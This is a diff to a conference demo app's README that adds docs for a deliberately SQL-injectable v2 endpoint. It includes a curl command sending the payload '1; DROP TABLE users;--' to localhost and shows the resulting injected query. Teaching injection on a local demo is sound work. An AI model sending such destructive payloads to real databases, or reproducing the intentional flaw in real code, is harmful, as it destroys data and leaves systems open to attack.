@@ -76,6 +76,29 @@ The talk slides can be found [here](./devsecops-25.pdf). The vulnerable app vers
      curl -X DELETE http://localhost:8080/v1/user/1
      ```
 
+### Vulnerable SQL Injection Demo (v2 endpoint)
+
+The v2 endpoint is intentionally vulnerable to SQL injection for demonstration purposes. Use with caution.
+
+- **Get a user (vulnerable):**
+
+  ```sh
+  curl http://localhost:8080/v2/user/1
+  ```
+
+- **SQL Injection Example:**
+
+    ```sh
+    curl "http://localhost:8080/v2/user/1%3B%20DROP%20TABLE%20users%3B--"  # spaces must be URL-encoded
+    ```
+
+  This payload demonstrates a classic SQL injection attack by attempting to drop the `users` table.
+    The SQL query would look like this:
+
+    ```sql
+    SELECT * FROM users WHERE id = '1'; DROP TABLE users;--'
+    ```
+
 ### Azure Infrastructure
 
 The `src/infra` folder contains Terraform code to provision the required Azure resources.
@@ -110,3 +133,4 @@ To destroy the resources when you are done:
 terraform destroy \
   -auto-approve
 ```
+````
